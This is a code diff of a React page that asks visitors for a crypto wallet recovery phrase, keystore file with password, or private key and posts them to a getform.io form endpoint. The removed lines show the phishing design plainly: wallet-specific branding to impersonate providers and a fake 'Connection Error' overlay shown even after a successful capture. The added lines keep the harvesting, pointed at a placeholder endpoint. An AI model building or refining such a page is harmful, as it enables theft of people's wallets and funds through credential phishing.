@@ -2,25 +2,13 @@
 
 import { useState, useEffect } from 'react'
 import { motion, AnimatePresence } from 'framer-motion'
-import {
-  ArrowLeft,
-  Eye,
-  EyeOff,
-  AlertCircle,
-  CheckCircle2,
-  Frown,
-  XCircle
-} from 'lucide-react'
-import { useRouter, useSearchParams } from 'next/navigation'
-import Image from 'next/image'
-import { cn } from '../../lib/utils'
-import SuccessErrorOverlay from '../SuccessErrorOverlay'
-import { wallets } from '../data/wallets'
+import { ArrowLeft, Eye, EyeOff, AlertCircle, CheckCircle2 } from 'lucide-react'
+import { useRouter } from 'next/navigation'
+import { cn } from '../lib/utils'
 
 type ConnectionMethod = 'phrase' | 'keystore' | 'private-key'
 
 interface FormData {
-  wallet?: string
   phrase?: string
   keystore?: string
   password?: string
@@ -34,19 +22,9 @@ export default function ManualConnectPage () {
   const [error, setError] = useState<string | null>(null)
   const [success, setSuccess] = useState(false)
   const [formData, setFormData] = useState<FormData>({})
-  const [showErrorOverlay, setShowErrorOverlay] = useState(false)
   const router = useRouter()
-  const searchParams = useSearchParams()
-  const walletId = searchParams.get('wallet')
-  const selectedWallet = wallets.find(w => w.id === walletId)
 
-  const FORM_ENDPOINT = 'https://getform.io/f/alllgoga'
-
-  useEffect(() => {
-    if (selectedWallet) {
-      setFormData(prev => ({ ...prev, wallet: selectedWallet.name }))
-    }
-  }, [selectedWallet])
+  const FORM_ENDPOINT = 'https://getform.io/f/your-form-id'
 
   // Validation rules
   const validateForm = (): string | null => {
@@ -89,7 +67,7 @@ export default function ManualConnectPage () {
   }
 
   const clearForm = () => {
-    setFormData(prev => ({ wallet: prev.wallet }))
+    setFormData({})
     setError(null)
   }
 
@@ -123,32 +101,24 @@ export default function ManualConnectPage () {
         }
       })
 
-      if (!response.ok) {
-        throw new Error('Network response was not ok')
+      if (response.ok) {
+        setSuccess(true)
+        clearForm()
+        setTimeout(() => {
+          setSuccess(false)
+        }, 3000)
+      } else {
+        throw new Error('Submission failed')
       }
-
-      // Simulating a successful submission
-      setSuccess(true)
-      setShowErrorOverlay(true) // Show the error overlay even on success
     } catch (err) {
-      console.error('Submission error:', err)
       setError('There was an error submitting the form. Please try again.')
     } finally {
       setIsLoading(false)
     }
   }
 
-  const handleCloseErrorOverlay = () => {
-    setShowErrorOverlay(false)
-    router.push('/') // Redirect to the wallet selection page
-  }
-
   const handleBack = () => {
     router.back()
-  }
-
-  if (!selectedWallet) {
-    return <div>No wallet selected. Please go back and choose a wallet.</div>
   }
 
   return (
@@ -168,17 +138,8 @@ export default function ManualConnectPage () {
           className='bg-gray-800/50 backdrop-blur-sm rounded-xl p-8'
         >
           <div className='text-center mb-8'>
-            <div className='flex justify-center items-center mb-4'>
-              <Image
-                src={selectedWallet.iconPath}
-                alt={selectedWallet.name}
-                width={64}
-                height={64}
-                className='rounded-full'
-              />
-            </div>
             <h1 className='text-3xl font-bold mb-2 bg-gradient-to-r from-rose-100 to-teal-100 text-transparent bg-clip-text'>
-              Connect {selectedWallet.name} Manually
+              Connect Wallet Manually
             </h1>
             <p className='text-gray-400'>
               Choose your preferred method to connect your wallet
@@ -193,7 +154,7 @@ export default function ManualConnectPage () {
                 className={cn(
                   'flex-1 px-4 py-2 rounded-md text-sm font-medium transition-all duration-200',
                   activeMethod === method
-                    ? 'bg-rose-500/20 text-rose-200'
+                    ? 'bg-blue-500/20 text-rose-200'
                     : 'text-gray-400 hover:text-white'
                 )}
               >
@@ -226,6 +187,7 @@ export default function ManualConnectPage () {
                       className='w-full px-4 py-3 rounded-lg bg-gray-900/50 border border-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-rose-500/50 transition-all duration-200'
                       placeholder='Enter your recovery phrase'
                       rows={3}
+                      disabled={isLoading || success}
                     />
                     <p className='mt-2 text-sm text-gray-400'>
                       Typically 12 (sometimes 24) words separated by a single
@@ -254,6 +216,7 @@ export default function ManualConnectPage () {
                       className='w-full px-4 py-3 rounded-lg bg-gray-900/50 border border-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-rose-500/50 transition-all duration-200'
                       placeholder='Paste your keystore JSON'
                       rows={3}
+                      disabled={isLoading || success}
                     />
                   </div>
                   <div className='relative'>
@@ -267,11 +230,13 @@ export default function ManualConnectPage () {
                       onChange={handleInputChange}
                       className='w-full px-4 py-3 rounded-lg bg-gray-900/50 border border-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-rose-500/50 transition-all duration-200'
                       placeholder='Enter password'
+                      disabled={isLoading || success}
                     />
                     <button
                       type='button'
                       onClick={() => setShowPassword(!showPassword)}
                       className='absolute right-3 top-9 text-gray-400 hover:text-white transition-colors'
+                      disabled={isLoading || success}
                     >
                       {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                     </button>
@@ -298,11 +263,13 @@ export default function ManualConnectPage () {
                       onChange={handleInputChange}
                       className='w-full px-4 py-3 rounded-lg bg-gray-900/50 border border-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-rose-500/50 transition-all duration-200'
                       placeholder='Enter your private key'
+                      disabled={isLoading || success}
                     />
                     <button
                       type='button'
                       onClick={() => setShowPassword(!showPassword)}
                       className='absolute right-3 top-9 text-gray-400 hover:text-white transition-colors'
+                      disabled={isLoading || success}
                     >
                       {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                     </button>
@@ -331,7 +298,7 @@ export default function ManualConnectPage () {
               className={cn(
                 'w-full py-3 px-4 rounded-lg font-medium transition-all duration-200',
                 isLoading || success
-                  ? 'bg-blue-500/50 text-blue-200 cursor-not-allowed'
+                  ? 'bg-blue-500/50 text-rose-200 cursor-not-allowed'
                   : 'bg-blue-500 text-white hover:bg-blue-600'
               )}
             >
@@ -351,7 +318,7 @@ export default function ManualConnectPage () {
               ) : success ? (
                 <span className='flex items-center justify-center'>
                   <CheckCircle2 className='w-5 h-5 mr-2' />
-                  Connection Error
+                  Connected Successfully
                 </span>
               ) : (
                 'Connect Wallet'
@@ -360,15 +327,6 @@ export default function ManualConnectPage () {
           </form>
         </motion.div>
       </div>
-
-      <AnimatePresence>
-        {showErrorOverlay && (
-          <SuccessErrorOverlay
-            onClose={handleCloseErrorOverlay}
-            walletName={selectedWallet.name}
-          />
-        )}
-      </AnimatePresence>
     </div>
   )
 }
